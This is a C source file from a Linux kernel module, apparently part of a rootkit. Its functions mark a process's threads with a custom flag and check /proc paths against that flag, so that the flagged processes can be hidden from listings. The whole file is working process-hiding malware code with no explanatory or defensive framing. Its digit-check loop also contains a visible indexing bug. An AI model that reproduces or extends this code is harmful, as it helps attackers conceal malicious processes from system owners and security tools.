#include <linux/version.h>
#include <linux/uaccess.h>
#include <linux/ctype.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/limits.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
#	include <linux/sched/signal.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 2, 0)
#	include "string_helpers.h"
#endif

#include "proc.h"

int flag_tasks(pid_t pid, int set)
{
	int ret = 0;
	struct pid *p;

	rcu_read_lock();
	p = find_get_pid(pid);
	if (p) {
		struct task_struct *task = get_pid_task(p, PIDTYPE_PID);
		if (task) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			struct task_struct *t = NULL;

			for_each_thread(task, t)
			{
				if (set)
					t->flags |= FLAG;
				else
					t->flags &= ~FLAG;

				ret++;
			}
#endif
			if (set)
				task->flags |= FLAG;
			else
				task->flags &= ~FLAG;

			put_task_struct(task);
		}
		put_pid(p);
	}
	rcu_read_unlock();
	return ret;
}

struct task_struct *find_task(pid_t pid)
{
	struct task_struct *p = current;
	struct task_struct *ret = NULL;

	rcu_read_lock();
	for_each_process(p)
	{
		if (p->pid == pid) {
			get_task_struct(p);
			ret = p;
		}
	}
	rcu_read_unlock();

	return ret;
}

int is_proc_invisible(pid_t pid)
{
	struct task_struct *task;
	int ret = 0;

	if (!pid)
		return ret;

	task = find_task(pid);
	if (!task)
		return ret;

	if (is_task_invisible(task))
		ret = 1;

	put_task_struct(task);
	return ret;
}

int is_proc_invisible_2(const char __user *filename)
{
	int ret = 0, i, argc, is_num = 1;
	pid_t pid = 0;
	char **a;
	char *name = kmalloc(PATH_MAX, GFP_KERNEL);

	if (strncpy_from_user(name, filename, PATH_MAX) > 0) {
		if (strncmp(name, "/proc/", 6) == 0) {
			strreplace(name, '/', ' ');

			a = argv_split(GFP_KERNEL, name, &argc);

			for (i = 0; i < strlen(a[1]); i++) {
				if (!isdigit(*a[1]))
					is_num = 0;
			}

			if (is_num) {			
				if (kstrtoint(a[1], 10, &pid) == 0) {
					if (is_proc_invisible(pid))
						ret = 1;
				}
			}

			argv_free(a);
		}
	}

	kfree(name);
	return ret;
}

void hide_proc(pid_t pid)
{
	if (is_proc_invisible(pid))
		flag_tasks(pid, 0);
	else
		flag_tasks(pid, 1);
}

/*
void hide_proc(char *pid_str)
{
	pid_t pid;

	if (kstrtoint(pid_str, 10, &pid) == 0) {
		if (is_proc_invisible(pid))
			flag_tasks(pid, 0);
		else
			flag_tasks(pid, 1);
	}
}
*/